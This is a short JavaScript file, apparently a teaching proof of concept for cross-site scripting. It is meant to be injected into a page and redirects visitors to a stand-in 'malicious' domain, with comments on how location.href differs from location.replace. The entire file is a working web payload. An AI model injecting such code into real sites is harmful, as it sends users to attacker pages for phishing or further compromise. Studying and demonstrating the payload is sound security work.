// A third basic XSS example to be included into a page for proof of concept (PoC)
// Redirects the user to a "malicious" website
// NOTE: window.location.replace will not "remember" the page in the browser's "back button" history.
// Use location.href to simulate a link click; use location.replace to simulate an HTTP redirect.
window.location.href = "https://mikeisevil.com/hacked.html";
